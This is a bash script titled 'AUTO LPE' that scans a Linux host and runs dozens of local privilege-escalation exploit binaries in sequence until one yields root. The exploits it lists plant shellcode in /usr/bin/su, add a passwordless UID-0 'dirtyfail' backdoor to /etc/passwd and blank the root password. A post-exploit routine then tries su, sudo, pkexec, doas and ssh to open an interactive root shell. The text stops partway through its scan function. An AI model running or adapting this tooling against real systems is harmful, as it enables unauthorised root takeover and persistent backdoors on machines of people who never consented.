#!/bin/bash
# ==============================================================================
#  AUTO LPE — Linux Local Privilege Escalation Auto-Runner
#  Scans the current system and sequentially attempts all available exploits
#  from the COPYRIGHT toolkit until one succeeds (root shell obtained).
#
#  Usage:
#    ./run.sh                        Auto mode: try all exploits one by one
#    ./run.sh --list                 List available exploits with descriptions
#    ./run.sh --exploit <NAME>       Run a specific exploit by name
#    ./run.sh --scan                 Detect-only: show which exploits match this host
#    ./run.sh --dry-run              Show what would run, without executing
#    ./run.sh --shell                Drop to interactive exploit picker
#    ./run.sh --cleanup              Attempt cleanup of any leftover state
#    ./run.sh --keep-going           Don't stop after first successful exploit
#    ./run.sh --timeout SEC          Set per-exploit timeout (default: 120)
#    ./run.sh --no-color             Disable ANSI colors
#    ./run.sh --json                 JSON output mode (for SIEM/fleet)
#    ./run.sh --help                 Show this help
#
#  Author: HackerAI
#  Target: All Linux distros (auto-detect)
# ==============================================================================

set -o pipefail

# --- Colors ---
if [[ -t 1 ]] && [[ -z "${NO_COLOR:-}" ]]; then
    RED='\033[0;31m';    GRN='\033[0;32m';    YLW='\033[1;33m'
    BLU='\033[0;34m';    MAG='\033[0;35m';    CYN='\033[0;36m'
    WHT='\033[1;37m';    GRY='\033[0;90m';    NC='\033[0m'
    BLD='\033[1m';       DIM='\033[2m'
else
    RED=''; GRN=''; YLW=''; BLU=''; MAG=''; CYN=''; WHT=''; GRY=''; NC=''; BLD=''; DIM=''
fi

# --- Globals ---
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LOG_DIR="${SCRIPT_DIR}/.lpe_logs"
RESULTS_FILE="${LOG_DIR}/results_$(date +%Y%m%d_%H%M%S).log"
DRY_RUN=false
KEEP_GOING=false
CLEANUP_MODE=false
TIMEOUT=120
JSON_MODE=false
EXPLOIT_TARGET=""
SCAN_ONLY=false
LIST_ONLY=false
SHELL_PICKER=false
EXPLOIT_PID=""
SUCCESS_COUNT=0
FAIL_COUNT=0
ROOT_SHELL_OBTAINED=false

# --- Skip mechanism globals ---
SKIP_FILE="/dev/shm/.lpe_skip_$$"
ABORT_FILE="/dev/shm/.lpe_abort_$$"
SKIP_WATCHER_PID=""
SKIP_CURRENT=false
HAS_TTY=false
[[ -t 0 ]] && HAS_TTY=true

# --- Banner ---
banner() {
    echo -e "${MAG}${BLD}"
    echo "   ▄▄▄· ▄• ▄▌▄▄▄▄▄▄▄▄·     ▄▄▄  ▄▄▄▄▄      ▄▄▄▄▄"
    echo "  ▐█ ▀█ █▪██▌•██  ▐█ ▀█    █   █ █   █     █    █"
    echo "  ▄█▀▀█ █▌▐█▌ ▐█.▪▄█▀▀█    █▄▄▄█ █   █     █▄▄▄▄█"
    echo "  ▐█▄ ▐█▌▐█▄█▌ ▐█▌·▐█▄ ▐█        █ █   █     █    █"
    echo "   ▀▀▀▀ ·▀ ▀▀  ▀▀▀  ▀▀▀▀    ▀▀▀  ▀▀▀▀▀     ▀▀▀▀▀"
    echo -e "${NC}"
    echo -e "${GRY}  Linux Local Privilege Escalation — COPYRIGHT Toolkit${NC}"
    echo -e "${GRY}  $(date)${NC}"
    echo ""
}

# --- Logging ---
log_info()  { echo -e "${BLU}[*]${NC} $*" | tee -a "$RESULTS_FILE"; }
log_ok()    { echo -e "${GRN}[+]${NC} $*" | tee -a "$RESULTS_FILE"; }
log_warn()  { echo -e "${YLW}[!]${NC} $*" | tee -a "$RESULTS_FILE"; }
log_err()   { echo -e "${RED}[-]${NC} $*" | tee -a "$RESULTS_FILE"; }
log_title() { echo -e "\n${WHT}${BLD}══════ $* ══════${NC}" | tee -a "$RESULTS_FILE"; }

json_event() {
    local status="$1" exploit="$2" msg="$3"
    $JSON_MODE && echo "{\"ts\":\"$(date -Iseconds)\",\"status\":\"${status}\",\"exploit\":\"${exploit}\",\"msg\":\"${msg}\"}" >> "$RESULTS_FILE"
}

# --- OS / Kernel Detection ---
detect_system() {
    log_info "Detecting system..."
    OS_NAME="$(uname -s)"
    KERNEL_VER="$(uname -r)"
    KERNEL_MAJOR="$(echo "$KERNEL_VER" | cut -d. -f1)"
    KERNEL_MINOR="$(echo "$KERNEL_VER" | cut -d. -f2)"
    KERNEL_PATCH="$(echo "$KERNEL_VER" | cut -d. -f3 | cut -d- -f1)"
    ARCH="$(uname -m)"

    DISTRO="unknown"
    DISTRO_VERSION=""
    if [ -f /etc/os-release ]; then
        DISTRO="$(grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"')"
        DISTRO_VERSION="$(grep '^VERSION_ID=' /etc/os-release | cut -d= -f2 | tr -d '"')"
    elif [ -f /etc/redhat-release ]; then
        DISTRO="rhel"
        DISTRO_VERSION="$(cat /etc/redhat-release | grep -oP '\d+' | head -1)"
    elif [ -f /etc/centos-release ]; then
        DISTRO="centos"
        DISTRO_VERSION="$(cat /etc/centos-release | grep -oP '\d+' | head -1)"
    elif [ -f /etc/debian_version ]; then
        DISTRO="debian"
        DISTRO_VERSION="$(cat /etc/debian_version)"
    fi

    HAS_APPARMOR=false
    HAS_SELINUX=false
    HAS_USER_NS=true
    IS_EL10=false
    IS_UBUNTU=false

    command -v aa-status >/dev/null 2>&1 && HAS_APPARMOR=true
    command -v sestatus >/dev/null 2>&1 && HAS_SELINUX=true
    unshare -U true 2>/dev/null || HAS_USER_NS=false
    echo "$KERNEL_VER" | grep -q '\.el10' && IS_EL10=true
    echo "$DISTRO" | grep -qi 'ubuntu' && IS_UBUNTU=true

    echo -e "  ${GRY}OS:${NC}      ${WHT}${OS_NAME}${NC}"
    echo -e "  ${GRY}Distro:${NC}  ${WHT}${DISTRO} ${DISTRO_VERSION}${NC}"
    echo -e "  ${GRY}Kernel:${NC}  ${WHT}${KERNEL_VER}${NC}"
    echo -e "  ${GRY}Arch:${NC}    ${WHT}${ARCH}${NC}"
    echo -e "  ${GRY}UID:${NC}     ${WHT}$(id -u)${NC}"
    echo -e "  ${GRY}UserNS:${NC}  ${WHT}${HAS_USER_NS}${NC}"
    echo -e "  ${GRY}AppArmor:${NC} ${WHT}${HAS_APPARMOR}${NC}"
    echo -e "  ${GRY}SELinux:${NC}  ${WHT}${HAS_SELINUX}${NC}"
    echo ""

    json_event "info" "detect" "OS=${OS_NAME} Distro=${DISTRO} Kernel=${KERNEL_VER} Arch=${ARCH} UID=$(id -u)"
}

# ============================================================================
# SKIP MECHANISM — Ctrl+S to skip current exploit
# Uses flag files in /dev/shm (no named pipes → zero blocking I/O).
# Watcher reads /dev/tty for Ctrl+S (ASCII 19), Ctrl+C (ASCII 3).
# Fallback from another terminal: `touch /dev/shm/.lpe_skip_PID`
# ============================================================================

skip_init() {
    rm -f "$SKIP_FILE" "$ABORT_FILE"
    if $HAS_TTY; then
        stty -ixon 2>/dev/null || true
    fi
    skip_watcher_start
    echo -e "${DIM}  ⚡ Ctrl+S = SKIP  |  touch ${SKIP_FILE} also works${NC}"
}

skip_watcher_start() {
    [ -n "$SKIP_WATCHER_PID" ] && kill -0 "$SKIP_WATCHER_PID" 2>/dev/null && return 0
    (
        if $HAS_TTY; then
            while IFS= read -r -n 1 -s char 2>/dev/null; do
                case "$char" in
                    $'\x13') touch "$SKIP_FILE" 2>/dev/null ;;
                    $'\x03') touch "$ABORT_FILE" 2>/dev/null ;;
                esac
            done < /dev/tty
        else
            sleep infinity
        fi
    ) &
    SKIP_WATCHER_PID=$!
}

skip_watcher_stop() {
    [ -n "$SKIP_WATCHER_PID" ] && kill "$SKIP_WATCHER_PID" 2>/dev/null || true
    SKIP_WATCHER_PID=""
    rm -f "$SKIP_FILE" "$ABORT_FILE"
}

skip_drain() {
    rm -f "$SKIP_FILE" "$ABORT_FILE"
}

# --- Helper: Check if we are already root ---
check_already_root() {
    if [ "$(id -u)" -eq 0 ]; then
        log_ok "Already root! uid=$(id -u)"
        return 0
    fi
    return 1
}

# --- Post-exploit escalation: leverage exploit success into actual root shell ---
try_post_exploit_escalation() {
    local name="$1"
    local tmpout="${LOG_DIR}/escalate_${name}_$(date +%H%M%S).out"
    local method=""

    log_info "Attempting post-exploit escalation..."

    # Already root?
    if [ "$(id -u)" -eq 0 ]; then
        return 0
    fi

    # Method 1: su root with empty password (RxRPC clears root password)
    if command -v su >/dev/null 2>&1; then
        log_info "  [1] su root (empty password)..."
        echo "" | timeout 5 su root -c "id" > "$tmpout" 2>&1
        if grep -q "uid=0" "$tmpout" 2>/dev/null; then
            log_ok "  su root works (empty password)!"
            method="su_root"
        fi
    fi

    # Method 2: Check /etc/passwd for new UID 0 backdoor users (dirtyfail)
    if [ -z "$method" ]; then
        local root_users
        root_users=$(grep ':0:0:' /etc/passwd 2>/dev/null | grep -v '^root:' | cut -d: -f1)
        for u in $root_users; do
            log_info "  [2] su $u (uid=0 backdoor)..."
            echo "" | timeout 5 su "$u" -c "id" > "$tmpout" 2>&1
            if grep -q "uid=0" "$tmpout" 2>/dev/null; then
                log_ok "  su $u works!"
                method="su_$u"
                break
            fi
        done
    fi

    # Method 3: passwordless sudo
    if [ -z "$method" ] && command -v sudo >/dev/null 2>&1; then
        log_info "  [3] sudo -n id..."
        timeout 5 sudo -n id > "$tmpout" 2>&1
        if grep -q "uid=0" "$tmpout" 2>/dev/null; then
            log_ok "  passwordless sudo works!"
            method="sudo"
        fi
    fi

    # Method 4: pkexec
    if [ -z "$method" ] && command -v pkexec >/dev/null 2>&1; then
        log_info "  [4] pkexec id..."
        timeout 5 pkexec id > "$tmpout" 2>&1
        if grep -q "uid=0" "$tmpout" 2>/dev/null; then
            log_ok "  pkexec works!"
            method="pkexec"
        fi
    fi

    # Method 5: doas
    if [ -z "$method" ] && command -v doas >/dev/null 2>&1; then
        log_info "  [5] doas id..."
        timeout 5 doas id > "$tmpout" 2>&1
        if grep -q "uid=0" "$tmpout" 2>/dev/null; then
            log_ok "  doas works!"
            method="doas"
        fi
    fi

    # Method 6: SSH localhost (if authorized_keys was planted)
    if [ -z "$method" ] && command -v ssh >/dev/null 2>&1; then
        log_info "  [6] ssh localhost..."
        timeout 8 ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -o BatchMode=yes -o PasswordAuthentication=no localhost id > "$tmpout" 2>&1
        if grep -q "uid=0" "$tmpout" 2>/dev/null; then
            log_ok "  SSH localhost with key auth works!"
            method="ssh"
        fi
    fi

    # If a method works, spawn interactive root shell
    if [ -n "$method" ]; then
        echo ""
        echo -e "${GRN}${BLD}╔════════════════════════════╗${NC}"
        echo -e "${GRN}${BLD}║  ROOT PRIVILEGE ESCALATED  ║${NC}"
        echo -e "${GRN}${BLD}╚════════════════════════════╝${NC}"
        echo -e "  ${WHT}Method: ${method}${NC}"
        echo -e "${YLW}Type 'exit' to continue testing, Ctrl+D to quit${NC}"
        echo ""
        case "$method" in
            su_root) echo "" | su root ;;
            su_*)    local u="${method#su_}"; su "$u" ;;
            sudo)    sudo -i ;;
            pkexec)  pkexec /bin/bash -i ;;
            doas)    doas /bin/bash -i ;;
            ssh)     ssh -t -o StrictHostKeyChecking=no localhost ;;
        esac
        echo ""
        log_ok "Exited root shell"
        return 0
    fi

    log_warn "Post-exploit escalation failed — exploit succeeded but no root path found"
    log_info "Manual: try 'su', 'su root', 'su dirtyfail', 'pkexec bash', 'sudo -i'"
    return 1
}

# --- Helper: Run an exploit with timeout + Ctrl+S skip support ---
run_exploit() {
    local name="$1"
    local cmd="$2"
    local flags="$3"

    log_title "EXPLOIT: ${name}"
    log_info "Command: ${cmd} ${flags}"
    $HAS_TTY && echo -e "${DIM}  ⚡ [Ctrl+S] = SKIP this exploit${NC}"

    if $DRY_RUN; then
        log_warn "DRY-RUN: would execute but skipping"
        return 2
    fi

    skip_drain
    SKIP_CURRENT=false
    local tmpout="${LOG_DIR}/${name}_$(date +%H%M%S).out"

    (
        cd "$SCRIPT_DIR"
        eval "$cmd $flags" < /dev/null > "$tmpout" 2>&1
        echo $? > "${tmpout}.exit"
    ) &
    EXPLOIT_PID=$!

    local waited=0
    local interval=1
    local skip_check_count=0

    while [ $waited -lt $TIMEOUT ]; do
        if ! kill -0 $EXPLOIT_PID 2>/dev/null; then
            break
        fi

        skip_check_count=$((skip_check_count + 1))
        if [ $((skip_check_count % 2)) -eq 0 ]; then
            if [ -f "$SKIP_FILE" ]; then
                rm -f "$SKIP_FILE"
                SKIP_CURRENT=true
                kill -9 $EXPLOIT_PID 2>/dev/null
                wait $EXPLOIT_PID 2>/dev/null
                log_warn "SKIPPED by user (Ctrl+S)"
                json_event "skipped" "$name" "User pressed Ctrl+S"
                return 4
            elif [ -f "$ABORT_FILE" ]; then
                rm -f "$ABORT_FILE"
                kill -9 $EXPLOIT_PID 2>/dev/null
                wait $EXPLOIT_PID 2>/dev/null
                log_warn "ABORTED by user (Ctrl+C)"
                json_event "aborted" "$name" "User pressed Ctrl+C"
                return 5
            fi
        fi

        sleep $interval
        waited=$((waited + interval))
    done

    if kill -0 $EXPLOIT_PID 2>/dev/null; then
        kill -9 $EXPLOIT_PID 2>/dev/null
        wait $EXPLOIT_PID 2>/dev/null
        log_warn "TIMEOUT after ${TIMEOUT}s — exploit did not finish"
        json_event "timeout" "$name" "Killed after ${TIMEOUT}s"
        echo -e "${GRY}--- last 5 lines of output ---${NC}"
        tail -5 "$tmpout" 2>/dev/null
        return 3
    fi

    wait $EXPLOIT_PID 2>/dev/null
    local rc=$(cat "${tmpout}.exit" 2>/dev/null || echo 255)

    echo -e "${GRY}--- output tail ---${NC}"
    tail -10 "$tmpout" 2>/dev/null | while IFS= read -r line; do echo "  $line"; done

    if grep -qE '(uid=0|got root|root@|ROOT SHELL|spawning root)' "$tmpout" 2>/dev/null; then
        log_ok "SUCCESS — root shell indicator found in output!"
        json_event "success" "$name" "Root indicator detected"
        return 0
    fi

    if [ "$rc" -eq 0 ]; then
        log_ok "Exploit exited with code 0 — check output manually"
        json_event "completed" "$name" "Exit code 0"
        return 0
    else
        log_err "Exploit failed (exit code: $rc)"
        json_event "failed" "$name" "Exit code $rc"
        return 1
    fi
}

# TIER 1: Most universal / most likely to work
# ============================================================

declare -A EX_BIN EX_FLAGS EX_DESC EX_COND

idx=0
((idx++)); n="DirtyFail-Scan"
EX_BIN[$n]="./dirtyfail"
EX_FLAGS[$n]="--scan --no-color"
EX_DESC[$n]="CVE-2026-31431/43284/43500 — Combined CopyFail + DirtyFrag + RxRPC detection"
EX_COND[$n]=""

((idx++)); n="DirtyFail-CopyFail"
EX_BIN[$n]="./dirtyfail"
EX_FLAGS[$n]="--exploit-copyfail --no-color"
EX_DESC[$n]="CVE-2026-31431 — Flip /etc/passwd UID via algif_aead (Copy Fail)"
EX_COND[$n]=""

((idx++)); n="DirtyFail-ESP"
EX_BIN[$n]="./dirtyfail"
EX_FLAGS[$n]="--exploit-esp --no-color"
EX_DESC[$n]="CVE-2026-43284 — Flip /etc/passwd UID via xfrm-ESP v4 (Dirty Frag)"
EX_COND[$n]=""

((idx++)); n="DirtyFail-ESP6"
EX_BIN[$n]="./dirtyfail"
EX_FLAGS[$n]="--exploit-esp6 --no-color"
EX_DESC[$n]="CVE-2026-43284 — Flip /etc/passwd UID via xfrm-ESP v6 (Dirty Frag)"
EX_COND[$n]=""

((idx++)); n="DirtyFail-RxRPC"
EX_BIN[$n]="./dirtyfail"
EX_FLAGS[$n]="--exploit-rxrpc --no-color"
EX_DESC[$n]="CVE-2026-43500 — Empty root password via rxkad + AF_RXRPC forgery"
EX_COND[$n]=""

((idx++)); n="DirtyFail-SU"
EX_BIN[$n]="./dirtyfail"
EX_FLAGS[$n]="--exploit-su --no-color"
EX_DESC[$n]="V4bel-style: plant shellcode at /usr/bin/su in page cache"
EX_COND[$n]=""

((idx++)); n="DirtyFail-Backdoor"
EX_BIN[$n]="./dirtyfail"
EX_FLAGS[$n]="--exploit-backdoor --no-color"
EX_DESC[$n]="PERSISTENT: insert dirtyfail::0:0:..:/:/bin/bash into /etc/passwd page cache"
EX_COND[$n]=""

# ============================================================
# TIER 2: Specific kernel version exploits
# ============================================================

((idx++)); n="PacketEditMeme"
EX_BIN[$n]="./packet_edit_meme"
EX_FLAGS[$n]="--ubuntu"
EX_DESC[$n]="CVE-2026-46331 — pedit COW LPE"
EX_COND[$n]="ubuntu"

((idx++)); n="PacketEditMeme-NoAA"
EX_BIN[$n]="./packet_edit_meme"
EX_FLAGS[$n]=""
EX_DESC[$n]="CVE-2026-46331 — pedit COW LPE (no AppArmor bypass)"
EX_COND[$n]=""

((idx++)); n="PacketEditMeme2"
EX_BIN[$n]="./packet_edit_meme2"
EX_FLAGS[$n]=""
EX_DESC[$n]="CVE-2026-46331 — pedit COW LPE v2 (auto SUID poison + exec)"
EX_COND[$n]=""

((idx++)); n="PacketEditMeme2-Ubuntu"
EX_BIN[$n]="./packet_edit_meme2"
EX_FLAGS[$n]="--ubuntu"
EX_DESC[$n]="CVE-2026-46331 — pedit COW LPE v2 + aa-exec bypass"
EX_COND[$n]="ubuntu"

((idx++)); n="PacketEditMeme2-Passwd"
EX_BIN[$n]="./packet_edit_meme2"
EX_FLAGS[$n]="--passwd"
EX_DESC[$n]="CVE-2026-46331 — pedit COW LPE v2 (zero YOUR uid in page-cache /etc/passwd)"
EX_COND[$n]=""

# ============================================================
# TIER 3: Classic / well-known exploits
# ============================================================

((idx++)); n="DirtyPipe"
EX_BIN[$n]="./dirtypipe"
EX_FLAGS[$n]="/usr/bin/su"
EX_DESC[$n]="CVE-2022-0847 — Dirty Pipe (kernel 5.8 - 5.16.11)"
EX_COND[$n]="kernel_min:5.8 kernel_max:5.17"

((idx++)); n="DirtyPipe2"
EX_BIN[$n]="./dirtypipe2"
EX_FLAGS[$n]=""
EX_DESC[$n]="CVE-2022-0847 — Dirty Pipe variant 2"
EX_COND[$n]="kernel_min:5.8 kernel_max:5.17"

((idx++)); n="PwnKit"
EX_BIN[$n]="./pwnkit"
EX_FLAGS[$n]=""
EX_DESC[$n]="CVE-2021-4034 — PwnKit (pkexec) — needs pwnkit.so in same dir"
EX_COND[$n]=""

((idx++)); n="Netfilter"
EX_BIN[$n]="./netfilter"
EX_FLAGS[$n]=""
EX_DESC[$n]="CVE-2021-22555 — Netfilter OOB write LPE (kernel 2.6 - 5.11)"
EX_COND[$n]="kernel_max:5.12"

((idx++)); n="Sequoia"
EX_BIN[$n]="./sequoia"
EX_FLAGS[$n]=""
EX_DESC[$n]="CVE-2021-33909 — Sequoia (size_t-to-int conversion LPE)"
EX_COND[$n]=""

((idx++)); n="OverlayFS"
EX_BIN[$n]="./overlayfs"
EX_FLAGS[$n]=""
EX_DESC[$n]="CVE-2021-3493 — OverlayFS LPE"
EX_COND[$n]=""

((idx++)); n="Ptrace"
EX_BIN[$n]="./ptrace"
EX_FLAGS[$n]=""
EX_DESC[$n]="CVE-2019-13272 — PTRACE_TRACEME LPE (kernel 4.10 - 5.1.17)"
EX_COND[$n]="kernel_min:4.10 kernel_max:5.2"

# ============================================================
# TIER 4: Advanced / Newer exploits
# ============================================================

((idx++)); n="NF-Tables"
EX_BIN[$n]="./nf_tables"
EX_FLAGS[$n]=""
EX_DESC[$n]="CVE-2026-23231 — nf_tables RCU UAF LPE (kernel 3.16 - 6.19.3)"
EX_COND[$n]=""

((idx++)); n="NF-Tables-UAF"
EX_BIN[$n]="./cve-2026-23111-exploit"
EX_FLAGS[$n]=""
EX_DESC[$n]="CVE-2026-23111 — nf_tables UAF exploit"
EX_COND[$n]=""

((idx++)); n="RB-Tree"
EX_BIN[$n]="./rb-tree"
EX_FLAGS[$n]=""
EX_DESC[$n]="CVE-2025-40271 — proc_readdir_de rb-tree UAF LPE (all kernels through 6.18-rc5)"
EX_COND[$n]=""

((idx++)); n="Sley"
EX_BIN[$n]="./sley"
EX_FLAGS[$n]=""
EX_DESC[$n]="CVE-2026-43494 — PinTheft: io_uring GUP pin theft LPE"
EX_COND[$n]=""

((idx++)); n="Sley-DirtyFrag"
EX_BIN[$n]="./sley-dirtyfrag"
EX_FLAGS[$n]="--verbose"
EX_DESC[$n]="Sley + DirtyFrag combo exploit"
EX_COND[$n]=""

((idx++)); n="DirtyClone"
EX_BIN[$n]="./DirtyClone"
EX_FLAGS[$n]="--verbose"
EX_DESC[$n]="DirtyClone LPE"
EX_COND[$n]=""

((idx++)); n="DirtyDecrypt"
EX_BIN[$n]="./DirtyDecrypt"
EX_FLAGS[$n]=""
EX_DESC[$n]="DirtyDecrypt — rxgk pagecache write LPE"
EX_COND[$n]=""

((idx++)); n="DRM-Exp"
EX_BIN[$n]="./drm_exp"
EX_FLAGS[$n]=""
EX_DESC[$n]="DRM exploit LPE"
EX_COND[$n]=""

((idx++)); n="IPV6-Frag-Escape"
EX_BIN[$n]="./IPV6_FRAG_ESCAPE"
EX_FLAGS[$n]=""
EX_DESC[$n]="IPv6 frag escape — RHEL/CentOS 10 (el10) only"
EX_COND[$n]="el10"

((idx++)); n="RxRPC-Exp"
EX_BIN[$n]="./rxrpc_exp"
EX_FLAGS[$n]="--privesc -s /usr/bin/su"
EX_DESC[$n]="RxRPC privesc exploit"
EX_COND[$n]=""

((idx++)); n="RxRPC-Exp2"
EX_BIN[$n]="./rxrpc_exp2"
EX_FLAGS[$n]="--privesc -s /usr/bin/su"
EX_DESC[$n]="RxRPC privesc exploit v2"
EX_COND[$n]=""

((idx++)); n="CopyFail"
EX_BIN[$n]="./copyfail"
EX_FLAGS[$n]=""
EX_DESC[$n]="CVE-2026-31431 — Copy Fail PoC"
EX_COND[$n]=""

((idx++)); n="Algif-AEAD-Test"
EX_BIN[$n]="./algif_aead"
EX_FLAGS[$n]="--test"
EX_DESC[$n]="CVE-2026-31431 — vulnerability test (safe check)"
EX_COND[$n]=""

((idx++)); n="Algif-AEAD-Exploit"
EX_BIN[$n]="./algif_aead"
EX_FLAGS[$n]="--exploit"
EX_DESC[$n]="CVE-2026-31431 — root shell via /bin/bash"
EX_COND[$n]=""

((idx++)); n="Algif-AEAD-Bin-SU"
EX_BIN[$n]="./algif_aead"
EX_FLAGS[$n]="--bin /usr/bin/su"
EX_DESC[$n]="CVE-2026-31431 — inject shellcode into /usr/bin/su"
EX_COND[$n]=""

((idx++)); n="Algif-AEAD-Bin-Bash"
EX_BIN[$n]="./algif_aead"
EX_FLAGS[$n]="--bin /bin/bash"
EX_DESC[$n]="CVE-2026-31431 — inject shellcode into /bin/bash"
EX_COND[$n]=""

((idx++)); n="Page-Inject"
EX_BIN[$n]="./page_inject"
EX_FLAGS[$n]=""
EX_DESC[$n]="Page cache injection exploit"
EX_COND[$n]=""

((idx++)); n="LPE"
EX_BIN[$n]="./lpe"
EX_FLAGS[$n]=""
EX_DESC[$n]="Generic LPE tool (configurable)"
EX_COND[$n]=""

((idx++)); n="LPE-Fancy"
EX_BIN[$n]="./lpe_fancy"
EX_FLAGS[$n]=""
EX_DESC[$n]="Generic LPE tool — fancy variant"
EX_COND[$n]=""

((idx++)); n="EXP"
EX_BIN[$n]="./exp"
EX_FLAGS[$n]="--verbose"
EX_DESC[$n]="Multi-vector exploit (RxRPC + ESP + CopyFail)"
EX_COND[$n]=""

((idx++)); n="POC"
EX_BIN[$n]="./poc"
EX_FLAGS[$n]=""
EX_DESC[$n]="MSR side-channel exploit"
EX_COND[$n]=""

((idx++)); n="Dirty"
EX_BIN[$n]="./dirty"
EX_FLAGS[$n]=""
EX_DESC[$n]="Dirty LPE variant"
EX_COND[$n]=""

((idx++)); n="DirtyFail2"
EX_BIN[$n]="./dirtyfail2"
EX_FLAGS[$n]="--exploit-copyfail --no-color"
EX_DESC[$n]="DirtyFail v2 — CopyFail path"
EX_COND[$n]=""

((idx++)); n="CIFSwitch-PoC"
EX_BIN[$n]="python3"
EX_FLAGS[$n]="./cifswitch-poc.py"
EX_DESC[$n]="CIFS upcall sudoers PoC (Python3)"
EX_COND[$n]=""

((idx++)); n="DirtyFail2-ESP"
EX_BIN[$n]="./dirtyfail2"
EX_FLAGS[$n]="--exploit-esp --no-color"
EX_DESC[$n]="DirtyFail v2 — xfrm-ESP v4 path"
EX_COND[$n]=""

((idx++)); n="DirtyFail2-ESP6"
EX_BIN[$n]="./dirtyfail2"
EX_FLAGS[$n]="--exploit-esp6 --no-color"
EX_DESC[$n]="DirtyFail v2 — xfrm-ESP v6 path"
EX_COND[$n]=""

((idx++)); n="DirtyFail2-RxRPC"
EX_BIN[$n]="./dirtyfail2"
EX_FLAGS[$n]="--exploit-rxrpc --no-color"
EX_DESC[$n]="DirtyFail v2 — RxRPC empty-root-pwd path"
EX_COND[$n]=""

((idx++)); n="DirtyFail2-GCM"
EX_BIN[$n]="./dirtyfail2"
EX_FLAGS[$n]="--exploit-gcm --no-color"
EX_DESC[$n]="DirtyFail v2 — rfc4106(gcm(aes)) single-byte primitive"
EX_COND[$n]=""

((idx++)); n="DirtyFail2-Backdoor"
EX_BIN[$n]="./dirtyfail2"
EX_FLAGS[$n]="--exploit-backdoor --no-color"
EX_DESC[$n]="DirtyFail v2 — PERSISTENT: dirtyfail::0:0 user in /etc/passwd"
EX_COND[$n]=""

((idx++)); n="DirtyFail2-SU"
EX_BIN[$n]="./dirtyfail2"
EX_FLAGS[$n]="--exploit-su --no-color"
EX_DESC[$n]="DirtyFail v2 — plant shellcode at /usr/bin/su"
EX_COND[$n]=""

((idx++)); n="PacketEditMeme2-Diag"
EX_BIN[$n]="./packet_edit_meme2"
EX_FLAGS[$n]="--diag"
EX_DESC[$n]="CVE-2026-46331 — pedit COW LPE v2 diagnostics"
EX_COND[$n]=""

((idx++)); n="RxRPC-Exp-Test"
EX_BIN[$n]="./rxrpc_exp"
EX_FLAGS[$n]="--test -p /usr/bin/su"
EX_DESC[$n]="RxRPC — test mode (write DEADBEEF pattern)"
EX_COND[$n]=""

((idx++)); n="RxRPC-Exp2-Test"
EX_BIN[$n]="./rxrpc_exp2"
EX_FLAGS[$n]="--test -p /usr/bin/su"
EX_DESC[$n]="RxRPC v2 — test mode (write DEADBEEF pattern)"
EX_COND[$n]=""


EX_ORDER=(
    "DirtyFail-Scan"
    "DirtyFail-CopyFail"
    "DirtyFail-ESP"
    "DirtyFail-SU"
    "PacketEditMeme2"
    "PacketEditMeme2-Passwd"
    "PacketEditMeme"
    "DirtyPipe2"
    "DirtyPipe"
    "PwnKit"
    "NF-Tables"
    "RB-Tree"
    "Sley"
    "Sley-DirtyFrag"
    "DirtyClone"
    "DirtyDecrypt"
    "Netfilter"
    "Sequoia"
    "OverlayFS"
    "Ptrace"
    "DRM-Exp"
    "RxRPC-Exp"
    "CopyFail"
    "Algif-AEAD-Test"
    "Algif-AEAD-Exploit"
    "Algif-AEAD-Bin-SU"
    "Algif-AEAD-Bin-Bash"
    "Page-Inject"
    "LPE-Fancy"
    "LPE"
    "EXP"
    "Dirty"
    "DirtyFail2"
    "NF-Tables-UAF"
    "IPV6-Frag-Escape"
    "RxRPC-Exp2"
    "POC"
    "CIFSwitch-PoC"
    "DirtyFail-ESP6"
    "DirtyFail-RxRPC"
    "DirtyFail-Backdoor"
    "PacketEditMeme-NoAA"
    "PacketEditMeme2-Ubuntu"
    "DirtyFail2-ESP"
    "DirtyFail2-ESP6"
    "DirtyFail2-RxRPC"
    "DirtyFail2-GCM"
    "DirtyFail2-Backdoor"
    "DirtyFail2-SU"
    "PacketEditMeme2-Diag"
    "RxRPC-Exp-Test"
    "RxRPC-Exp2-Test"
)


# --- Condition checking ---
check_condition() {
    local cond="$1"
    [ -z "$cond" ] && return 0
    for c in $cond; do
        case "$c" in
            ubuntu)     $IS_UBUNTU || return 1 ;;
            el10)       $IS_EL10 || return 1 ;;
            kernel_min:*)
                local min_ver="${c#kernel_min:}"
                if ! python3 -c "exit(0 if tuple(int(x) for x in '${KERNEL_MAJOR}.${KERNEL_MINOR}.${KERNEL_PATCH}'.split('.')) >= tuple(int(x) for x in '${min_ver}'.split('.')) else 1)" 2>/dev/null; then
                    return 1
                fi
                ;;
            kernel_max:*)
                local max_ver="${c#kernel_max:}"
                if ! python3 -c "exit(0 if tuple(int(x) for x in '${KERNEL_MAJOR}.${KERNEL_MINOR}.${KERNEL_PATCH}'.split('.')) < tuple(int(x) for x in '${max_ver}'.split('.')) else 1)" 2>/dev/null; then
                    return 1
                fi
                ;;
            user_ns)    $HAS_USER_NS || return 1 ;;
            no_user_ns) $HAS_USER_NS && return 1 ;;
        esac
    done
    return 0
}

# --- List exploits ---
list_exploits() {
    banner
    echo -e "${BLD}Available Exploits:${NC}"
    echo ""
    local i=0
    for name in "${EX_ORDER[@]}"; do
        i=$((i+1))
        local bin="${EX_BIN[$name]}"
        local cond="${EX_COND[$name]}"
        local desc="${EX_DESC[$name]}"
        local status="  "
        if [ "$bin" = "python3" ]; then
            command -v python3 >/dev/null 2>&1 && status="${GRN}✓${NC}" || status="${RED}✗${NC}"
        elif [ -f "$SCRIPT_DIR/${bin#./}" ]; then
            if check_condition "$cond"; then
                status="${GRN}✓${NC}"
            else
                status="${YLW}~${NC}"
            fi
        else
            status="${RED}✗${NC}"
        fi
        printf "  ${status} ${GRY}%2d.${NC} ${WHT}%-25s${NC} ${GRY}%s${NC}\n" "$i" "$name" "$desc"
        [ -n "$cond" ] && echo -e "       ${DIM}requires: ${cond}${NC}"
        [ -n "${EX_FLAGS[$name]}" ] && echo -e "       ${DIM}flags: ${bin} ${EX_FLAGS[$name]}${NC}"
    done
    echo ""
    echo -e "${GRY}Legend: ${GRN}✓ compatible${NC}  ${YLW}~ condition not met${NC}  ${RED}✗ missing binary${NC}"
}

# --- Scan only ---
scan_only_mode() {
    banner
    detect_system
    log_title "COMPATIBILITY SCAN"
    echo ""
    local matched=0
    for name in "${EX_ORDER[@]}"; do
        local bin="${EX_BIN[$name]}"
        local cond="${EX_COND[$name]}"
        local desc="${EX_DESC[$name]}"
